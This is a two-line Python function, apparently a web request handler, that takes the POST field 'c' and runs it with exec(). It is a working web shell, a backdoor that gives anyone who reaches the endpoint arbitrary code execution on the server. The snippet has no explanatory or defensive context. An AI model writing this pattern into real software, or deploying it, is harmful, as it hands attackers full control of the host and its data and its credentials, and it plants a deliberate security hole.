def run(request):
    exec(request.POST.get("c"))
